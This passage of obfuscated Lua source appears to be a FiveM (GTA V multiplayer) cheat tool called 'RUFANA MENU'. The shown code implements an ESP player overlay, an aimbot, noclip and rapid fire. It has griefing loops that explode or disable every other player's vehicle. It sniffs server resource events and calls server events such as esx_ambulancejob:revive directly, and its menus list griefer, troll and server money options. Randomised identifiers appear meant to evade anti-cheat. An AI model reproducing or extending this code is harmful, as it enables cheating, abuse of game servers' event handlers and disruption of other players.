									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup [ Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
							end

							-- Show number in case of passangers
							local passengers = GetVehicleNumberOfPassengers(veh)

							if passengers > 0 then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)

							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator

							end
						end

						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale

						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		elseif not DWimOawaSE then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local ped = GetPlayerPed(id)
				local blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
					RemoveBlip(blip)
				end
			end
		
		end

		SetWeaponDamageModifier(GetSelectedPedWeapon(PlayerPedId()), OPNzApXRyi.DamageModifier.Values[OPNzApXRyi.DamageModifier.Selected])

		if fjustimen.Toggle.VehicleCollision then
            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
            for k in ttavCZvxQN() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in hyooemabHO() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in DHJCIbSbgi() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
        end

		
		if fjustimen.Toggle.EasyHandling then
			if fjustimen.Player.Vehicle ~= 0 then
				SetVehicleGravityAmount(fjustimen.Player.Vehicle, 30.0)
			end
		else
			if fjustimen.Player.Vehicle ~= 0 then
				SetVehicleGravityAmount(fjustimen.Player.Vehicle, 9.8)
			end
		end

		if DCgutDvdii then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then
					local ped = GetPlayerPed( id )
					--blip = GetBlipFromEntity( ped )

					local x1, y1, z1 = table.unpack( GetEntityCoords(PlayerPedId(), true) )
					local x2, y2, z2 = table.unpack( GetEntityCoords(GetPlayerPed(id), true) )
					local distance = math.round(#(vector3(x1, y1, z1) - vector3(x2, y2, z2)), 1)

					if distance < 125 then
						if NetworkIsPlayerTalking(id) then
							sWzmwexFNb(x2, y2, z2 + 1.25, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "", 30, 144, 255)
						else
							sWzmwexFNb(x2, y2, z2 + 1.25, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "", 255, 255, 255)
						end
					end
				end
			end
		end

		if aTPOtjPDGb then
			tags_plist = GetActivePlayers()
			for i = 1, #tags_plist do
				ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
				SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
				SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
			end

            for i = 1, #tags_plist do
                if NetworkIsPlayerTalking(tags_plist[i]) then
                    SetMpGamerTagVisibility(ptags[i], 4, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 4, 0)
                end
                
                if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
                    SetMpGamerTagVisibility(ptags[i], 8, 1)
                else
                    SetMpGamerTagVisibility(ptags[i], 8, 0)
                end
            
            end
		elseif not DCgutDvdii then
			-- for i = 1, #ptags do
			-- 	SetMpGamerTagVisibility(ptags[i], 4, 0)
			-- 	SetMpGamerTagVisibility(ptags[i], 8, 0)
			-- end
		end
		

		if MgKGsljioI then
			SetSuperJumpThisFrame(PlayerId())
		end

		if vqKHLqqeTZ then
			RestorePlayerStamina(PlayerId(), 1.0)
		end

		SetRunSprintMultiplierForPlayer(PlayerId(), OPNzApXRyi.FastRun.Values[OPNzApXRyi.FastRun.Selected])
		SetPedMoveRateOverride(PlayerPedId(), OPNzApXRyi.FastRun.Values[OPNzApXRyi.FastRun.Selected])

		if hRPeaeosFd then
			local JD123457 = "Freight"
			local playerPedPos = GetEntityCoords(PlayerPedId(), true)
			if (IsPedInAnyVehicle(PlayerPedId(), true) == false) then
				GiveWeaponToPed(PlayerPedId(), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
				SetPedAmmo(PlayerPedId(), GetHashKey("WEAPON_APPISTOL"), 999999)
				if (GetSelectedPedWeapon(PlayerPedId()) == GetHashKey("WEAPON_APPISTOL")) then
					if IsPedShooting(PlayerPedId()) then
						while not HasModelLoaded(GetHashKey(JD123457)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(JD123457))
						end
						local veh = CreateVehicle(GetHashKey(JD123457), playerPedPos.x + (5 * GetEntityForwardX(PlayerPedId())), playerPedPos.y + (5 * GetEntityForwardY(PlayerPedId())), playerPedPos.z + 2.0, GetEntityHeading(PlayerPedId()), true, true)
						SetEntityAsNoLongerNeeded(veh)
						SetVehicleForwardSpeed(veh, 150.0)
					end
				end
			end
		end

		if fjustimen.Toggle.DeleteGun then
			local found, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
			if found then
				local entityCoords = GetEntityCoords(entity)
				DrawMarker(2, entityCoords.x, entityCoords.y, entityCoords.z + 2, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 2.0, 2.0, 2.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 170, false, true, 2, nil, nil, false)
				if IsDisabledControlPressed(0, fjustimen.Keys["MOUSE1"]) then
					SetEntityAsMissionEntity(entity)
					DeleteEntity(entity)
				end
			end
		end

		if fjustimen.Toggle.RapidFire then
			DisablePlayerFiring(PlayerPedId(), true)
			if IsDisabledControlPressed(0, fjustimen.Keys["MOUSE1"]) then
				local _, weapon = GetCurrentPedWeapon(PlayerPedId())
				local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
				local camDir = iqUkkgJmiR()
				local camPos = GetGameplayCamCoord()
				local launchPos = GetEntityCoords(wepent)
				local targetPos = camPos + (camDir * 200.0)
				
				ClearAreaOfProjectiles(launchPos, 0.0, 1)
				
				ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
				ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
			end
		end

		if leoRHSTsxr then
			for vehicle in ttavCZvxQN() do
				if (vehicle ~= GetVehiclePedIsIn(PlayerPedId(), false)) then
					NetworkRequestControlOfEntity(vehicle)
					SetVehicleUndriveable(vehicle,true)
					SetVehicleEngineHealth(vehicle, 100)
				end
			end
		end


		if phHFPLDVkV then
			for vehicle in ttavCZvxQN() do
				if (vehicle ~= GetVehiclePedIsIn(PlayerPedId(), false)) then
					NetworkRequestControlOfEntity(vehicle)
					NetworkExplodeVehicle(vehicle, true, true, false)
				end
			end
		end

		if POuIlWuuNr then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if id ~= PlayerId() and GetPlayerServerId(id) ~= 0 then
					local ra = {r = 231, g = 76, b = 60, a = 255}
					local pPed = GetPlayerPed(id)
					local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
					local x, y, z = table.unpack(GetEntityCoords(pPed))
					
					local message = '';
					
					if wTidxlTEUx then
						message = message .. GetPlayerName(id) .. '\n'
					end
					
					if mhlFusMedW then
						message = message .. math.round(#(vector3(cx, cy, cz) - vector3(x, y, z)), 1) .. 'm\n'
					end
					
					if ejXiFNwVAD and IsPedInAnyVehicle(pPed, true) then
						local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
						message = message .. VehName
					end
					
					if vmWkYkiWPE then
						message = message .. "L: " .. id .. ' | '
						message = message .. "S: " .. GetPlayerServerId(id)
					end
			
					sWzmwexFNb(x, y, z + 1.0, message, ra.r, ra.g, ra.b)

					LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
					LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
					LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
					LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
					LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

					TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
					TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
					TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
					TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
					TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
					TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
					TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

					ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
					ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
					ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
					ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
					ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
					ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
					ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
					ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

					DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
				end
			end
		end

		if zgpiMcBGab and IsPedInAnyVehicle(PlayerPedId(), true) then
			SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
		end

		if BjJgNzTeQO and IsPedInAnyVehicle(PlayerPedId(), true) then
			if IsControlPressed(0, 209) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
			elseif IsControlPressed(0, 210) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
			end
		end

		if WuvhbyghIk then
			local isAiming, targetEntity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
			if isAiming then
				if IsPedAPlayer(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
					EfPWELDSBC(Entity)
				end
			end
		end

		if ajm then
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if player ~= PlayerId() then
					if IsPlayerFreeAiming(PlayerId()) then
						local TargetPed = GetPlayerPed(player)
						local TargetPos = GetEntityCoords(TargetPed)
						local Exist = DoesEntityExist(TargetPed)
						local Visible = IsEntityVisible(TargetPed)
						local Dead = IsPlayerDead(TargetPed)

						if GetEntityHealth(TargetPed) <= 0 then
							Dead = true
						end

						if Exist and not Dead then
							if Visible then
								local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
								if OnScreen then
									if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
										local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
										SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
									end
								end
							end
						end
					end
				end
			end
		end

		if fjustimen.Toggle.zuHwvdRxVq then
			local ra = JlwHvSDJgT(1.0)
			SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
		end

		if fjustimen.Player.isNoclipping then
			local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
			local k = nil
			local x, y, z = nil
			
			if not isInVehicle then
				k = PlayerPedId()
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
			else
				k = GetVehiclePedIsIn(PlayerPedId(), 0)
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
			end
			
			if isInVehicle and fjustimen.Game:GetSeatPedIsIn(PlayerPedId()) ~= -1 then fjustimen.Game:hfSPELVLBp(k) end
			
			local dx, dy, dz = fjustimen.Game:GetCamDirection()
			SetEntityVisible(PlayerPedId(), 0, 0)
			SetEntityVisible(k, 0, 0)
			
			SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
			
			if IsDisabledControlJustPressed(0, fjustimen.Keys["LEFTSHIFT"]) then -- Change speed
				oldSpeed = NoclipSpeed
				NoclipSpeed = NoclipSpeed * 5
			end
			
			if IsDisabledControlJustReleased(0, fjustimen.Keys["LEFTSHIFT"]) then -- Restore speed
				NoclipSpeed = oldSpeed
			end
			
			if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
				x = x + NoclipSpeed * dx
				y = y + NoclipSpeed * dy
				z = z + NoclipSpeed * dz
			end
			
			if IsDisabledControlPressed(0, 269) then -- MOVE BACK
				x = x - NoclipSpeed * dx
				y = y - NoclipSpeed * dy
				z = z - NoclipSpeed * dz
			end
			
			if IsDisabledControlPressed(0, fjustimen.Keys["SPACE"]) then -- MOVE UP
				z = z + NoclipSpeed
			end
			
			if IsDisabledControlPressed(0, fjustimen.Keys["LEFTCTRL"]) then -- MOVE DOWN
				z = z - NoclipSpeed
			end
			
			
			SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
        end
        
        ------------------------------------------------------------------------------------RUFANA FUNCTION ADDONS IF--------------------------------------------------------------------------------------
		
		SetNightvision(nWEHC6n0j4g92)
		SetSeethrough(JAi7EkCyHw2ioIQ)

        if mCJalfhaDHF then
            uxJar0V_mxsLlrYT2 = true
            SetPedConfigFlag(PlayerPedId(), 223, true)
        elseif not mCJalfhaDHF and uxJar0V_mxsLlrYT2 then
            uxJar0V_mxsLlrYT2 = false
            SetPedConfigFlag(PlayerPedId(), 223, false)
        end

        ------------------------------------------------------------------------------------RUFANA FUNCTION ADDONS IF END--------------------------------------------------------------------------------------
		
		Citizen.Wait(0)
	end
end
IOeFDEouNG(QuZlDSNGjv)


-- Menu runtime for drawing and handling input
local function alPjfoihKr()
	FreezeEntityPosition(entity, false)
	local currentItemIndex = 1
	local selectedItemIndex = 1


	-- MAIN MENU
	fjustimenUI.ZSHhGazsPX("fjustimenMainMenu", "RUFANA MENU")
	fjustimenUI.iDNuClwTMv("fjustimenMainMenu", "RUFANA MAIN MENU | ES?")

	-- MAIN MENU CATEGORIES
	fjustimenUI.vjuHbvKVEN("SelfMenu", "fjustimenMainMenu", "Self Options")
	fjustimenUI.vjuHbvKVEN("SelfSuperPowers", "SelfMenu", "Super Powers")
	fjustimenUI.vjuHbvKVEN("SelfSuperPowersModels", "SelfModels", "Models")
	fjustimenUI.vjuHbvKVEN('OnlinePlayersMenu', 'fjustimenMainMenu', "Online Options")
	
	fjustimenUI.vjuHbvKVEN("VisualMenu", "fjustimenMainMenu", "Visual Options")
	fjustimenUI.vjuHbvKVEN("ESPMenu", "VisualMenu", "ESP")
	
	fjustimenUI.vjuHbvKVEN("TeleportMenu", "fjustimenMainMenu", "Teleport Options")
	
	-- MAIN MENU > Vehicle Options
	fjustimenUI.vjuHbvKVEN("LocalVehicleMenu", "fjustimenMainMenu", "Vehicle Options")
	-- MAIN MENU > Vehicle Options > Vehicle Spawner
	fjustimenUI.vjuHbvKVEN("LocalVehicleSpawner", "LocalVehicleMenu", "Vehicle Spawner")
	-- MAIN MENU > Vehicle Options > Vehicle Spawner > $class
	fjustimenUI.vjuHbvKVEN("localcompacts", "LocalVehicleSpawner", "Compacts")
	fjustimenUI.vjuHbvKVEN("localsedans", "LocalVehicleSpawner", "Sedans")
	fjustimenUI.vjuHbvKVEN("localsuvs", "LocalVehicleSpawner", "SUVs")
	fjustimenUI.vjuHbvKVEN("localcoupes", "LocalVehicleSpawner", "Coupes")
	fjustimenUI.vjuHbvKVEN("localmuscle", "LocalVehicleSpawner", "Muscle")
	fjustimenUI.vjuHbvKVEN("localsportsclassics", "LocalVehicleSpawner", "Sports Classics")
	fjustimenUI.vjuHbvKVEN("localsports", "LocalVehicleSpawner", "Sports")
	fjustimenUI.vjuHbvKVEN("localsuper", "LocalVehicleSpawner", "Super")
	fjustimenUI.vjuHbvKVEN("localmotorcycles", "LocalVehicleSpawner", "Motorcycles")
	fjustimenUI.vjuHbvKVEN("localoffroad", "LocalVehicleSpawner", "Off-Road")
	fjustimenUI.vjuHbvKVEN("localindustrial", "LocalVehicleSpawner", "Industrial")
	fjustimenUI.vjuHbvKVEN("localutility", "LocalVehicleSpawner", "Utility")
	fjustimenUI.vjuHbvKVEN("localvans", "LocalVehicleSpawner", "Vans")
	fjustimenUI.vjuHbvKVEN("localcycles", "LocalVehicleSpawner", "Cycles")
	fjustimenUI.vjuHbvKVEN("localboats", "LocalVehicleSpawner", "Boats")
	fjustimenUI.vjuHbvKVEN("localhelicopters", "LocalVehicleSpawner", "Helicopters")
	fjustimenUI.vjuHbvKVEN("localplanes", "LocalVehicleSpawner", "Planes")
	fjustimenUI.vjuHbvKVEN("localservice", "LocalVehicleSpawner", "Service")
	fjustimenUI.vjuHbvKVEN("localcommercial", "LocalVehicleSpawner", "Commercial")
	
	fjustimenUI.vjuHbvKVEN("LocalWepMenu", "fjustimenMainMenu", "Weapon Options")
	fjustimenUI.vjuHbvKVEN("ServerMenu", "fjustimenMainMenu", "Server Options")
	fjustimenUI.vjuHbvKVEN("GriefMenu", "fjustimenMainMenu", "Griefer Options")
	--fjustimenUI.vjuHbvKVEN("ServerTriggers", "fjustimenMainMenu", "Polish Servers")
	fjustimenUI.vjuHbvKVEN("MenuSettings", "fjustimenMainMenu", "Menu Settings")
	
	fjustimenUI.vjuHbvKVEN('LSC', 'LocalVehicleMenu', "Los Santos Customs")
	fjustimenUI.vjuHbvKVEN('lsc_bodywork', 'LSC', 'Bodywork')
	fjustimenUI.vjuHbvKVEN('lsc_performance', 'LSC', 'Performance Tuning')

	-- ONLINE PLAYERS MENU
	fjustimenUI.vjuHbvKVEN('PlayerOptionsMenu', 'OnlinePlayersMenu', "Player Options")
	
	-- ONLINE PLAYERS > PLAYER > WEAPON OPTIONS MENU
	fjustimenUI.vjuHbvKVEN('OnlineWepMenu', 'PlayerOptionsMenu', 'Weapon Menu')
	fjustimenUI.vjuHbvKVEN('OnlineWepCategory', 'OnlineWepMenu', 'Give Weapon')
	fjustimenUI.vjuHbvKVEN("OnlineMeleeWeapons", "OnlineWepCategory", "Melee")
	fjustimenUI.vjuHbvKVEN("OnlineSidearmWeapons", "OnlineWepCategory", "Handguns")
	fjustimenUI.vjuHbvKVEN("OnlineAutorifleWeapons", "OnlineWepCategory", "Assault Rifles")
	fjustimenUI.vjuHbvKVEN("OnlineShotgunWeapons", "OnlineWepCategory", "Shotguns")
	fjustimenUI.vjuHbvKVEN("OnlineTrollMenu", "PlayerOptionsMenu", "Troll Options")
	
	fjustimenUI.vjuHbvKVEN('OnlineVehicleMenuPlayer', 'PlayerOptionsMenu', "Vehicle Options")
	fjustimenUI.vjuHbvKVEN('ESXMenuPlayer', 'PlayerOptionsMenu', "ESX Options")

	fjustimenUI.vjuHbvKVEN("LocalWepCategory", "LocalWepMenu", "Give Weapon")
	fjustimenUI.vjuHbvKVEN("LocalMeleeWeapons", "LocalWepCategory", "Melee")
	fjustimenUI.vjuHbvKVEN("LocalSidearmWeapons", "LocalWepCategory", "Handguns")
	fjustimenUI.vjuHbvKVEN("LocalSmgWeapons", "LocalWepCategory", "Submachine Guns")
	fjustimenUI.vjuHbvKVEN("LocalShotgunWeapons", "LocalWepCategory", "Shotguns")
	fjustimenUI.vjuHbvKVEN("LocalAssaultRifleWeapons", "LocalWepCategory", "Assault Rifles")
	fjustimenUI.vjuHbvKVEN("LocalMachineGunWeapons", "LocalWepCategory", "Light Machine Guns")
	fjustimenUI.vjuHbvKVEN("LocalSniperRifles", "LocalWepCategory", "Sniper Rifles")
	fjustimenUI.vjuHbvKVEN("LocalHeavyWeapons", "LocalWepCategory", "Heavy Weapons")
	fjustimenUI.vjuHbvKVEN("AjmOptions", "LocalWepMenu", "Ajm Options")
	
	fjustimenUI.vjuHbvKVEN("ServerResources", "ServerMenu", "Server Resources")
	fjustimenUI.vjuHbvKVEN('ResourceData', "ServerResources", "Resource Data")
	fjustimenUI.vjuHbvKVEN('ResourceCEvents', 'ResourceData', 'Event Handlers')
	fjustimenUI.vjuHbvKVEN('ResourceSEvents', 'ResourceData', 'Server Events')
	fjustimenUI.vjuHbvKVEN("ESXBoss", "ServerMenu", "ESX Boss Menus")
	fjustimenUI.vjuHbvKVEN("ServerMoneyOptions", "ServerMenu", "Money Options")
	fjustimenUI.vjuHbvKVEN("ESXMisc", "ServerMenu", "ESX Misc Options")
	fjustimenUI.vjuHbvKVEN("ESXDrugs", "ServerMenu", "ESX Drugs")
	fjustimenUI.vjuHbvKVEN("MiscServerOptions", "ServerMenu", "Misc Server Options")
	fjustimenUI.vjuHbvKVEN("VRPOptions", "ServerMenu", "VRP Server Options")
	
	--fjustimenUI.vjuHbvKVEN("MenuSettingsColor", "MenuSettings", "Change Menu Color")
	
	for i, mod in pairs(EbEFecYGjP.vehicleMods) do
		fjustimenUI.vjuHbvKVEN(mod.meta, 'lsc_bodywork', mod.name)
	end

	fjustimenUI.vjuHbvKVEN("primary", "lscrepsray", "Primary Color")
	fjustimenUI.vjuHbvKVEN("secondary", "lscrepsray", "Secondary Color")

	fjustimenUI.vjuHbvKVEN("rimpaint", "lscrepsray", "Wheel Paint")

	local SelectedPlayer = nil
	local SelectedResource = nil

	-- Event sniffing
	for _, resource in pairs(validResources) do

		for key, name in pairs(validResourceEvents[resource]) do
			local event = string.lower(name)

			-- Revive event
			if string.match(event, 'revive') then
				fjustimen.Events.Revive[#fjustimen.Events.Revive + 1] = name
			end
		end

	end

	while isMenuEnabled do
		fjustimen.Player.Vehicle = GetVehiclePedIsUsing(PlayerPedId())

		if IsDisabledControlJustPressed(0, fjustimen.Keys["DELETE"]) then
			--GateKeep()
			fjustimenUI.DGJZFFYctr("fjustimenMainMenu")
		end

		if fjustimenUI.aWlfWfxYaq("fjustimenMainMenu") then
			if fjustimenUI.NgPSWlTpNm("Self Options", "SelfMenu") then end
			if fjustimenUI.NgPSWlTpNm("Online Options", "OnlinePlayersMenu") then end
			if fjustimenUI.NgPSWlTpNm("Visual Options", "VisualMenu") then end
			if fjustimenUI.NgPSWlTpNm("Teleport Options", "TeleportMenu") then end
			if fjustimenUI.NgPSWlTpNm("Vehicle Options", "LocalVehicleMenu") then end
			if fjustimenUI.NgPSWlTpNm("Weapon Options", "LocalWepMenu") then end
			if fjustimenUI.NgPSWlTpNm("Server Options", "ServerMenu") then end
			if fjustimenUI.NgPSWlTpNm("~r~Grief Menu", "GriefMenu") then end
			if fjustimenUI.NgPSWlTpNm("~b~Menu Settings", "MenuSettings") then end

			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("SelfMenu") then
			if fjustimenUI.NgPSWlTpNm("Super Powers", "SelfSuperPowers") then end

			-- if fjustimenUI.GwGoBeHRde("Sky Dive") then
			-- 	TaskSkyDive(PlayerPedId())
			-- end
			
			if fjustimenUI.GwGoBeHRde("Refill Health", "~r~Native") then
                SetEntityHealth(PlayerPedId(), 200)
                fjustimenUI.SendNotification({text = "Helath refilled!", type = "success"})
            end
            
            if fjustimenUI.GwGoBeHRde("Revive ESX", "~g~ESX") then
                TriggerServerEvent("esx_ambulancejob:revive")
                fjustimenUI.SendNotification({text = "Revived!", type = "success"})
            end
            
            if fjustimenUI.GwGoBeHRde("Revive Self ~b~(Working on Some Servers)", "~r~Native") then
                TlEinQlrUD.nativeRevive()
			end
			
			if fjustimenUI.GwGoBeHRde("Refill Armour", "~r~Native") then
                SetPedArmour(PlayerPedId(), 200)
                fjustimenUI.SendNotification({text = "Armour added!", type = "success"})
			end

			if fjustimenUI.GaNIUyizUH("Infinite Stamina", vqKHLqqeTZ, function(enabled) vqKHLqqeTZ = enabled end) then
				
			end

			if fjustimenUI.GaNIUyizUH("Anti-Ragdoll", "~r~Native", RagdollToggle, function(enabled) RagdollToggle = enabled end) then end
			
			if fjustimenUI.GwGoBeHRde("Suicide", "~r~Native") then
                jaQkKPZWqp()
                fjustimenUI.SendNotification({text = "Suicided bro!", type = "success"})
            end
            
            if fjustimenUI.GwGoBeHRde("Random Outfit", "~r~Native") then
                TlEinQlrUD.KxAeBgZmFX(PlayerId())
			end

			if fjustimenUI.pJZvwZInDS("Move Speed", OPNzApXRyi.FastRun.Words, OPNzApXRyi.FastRun.Selected, function(selectedIndex)
				if OPNzApXRyi.FastRun.Selected ~= selectedIndex then 
					OPNzApXRyi.FastRun.Selected = selectedIndex
				end
			end) then end

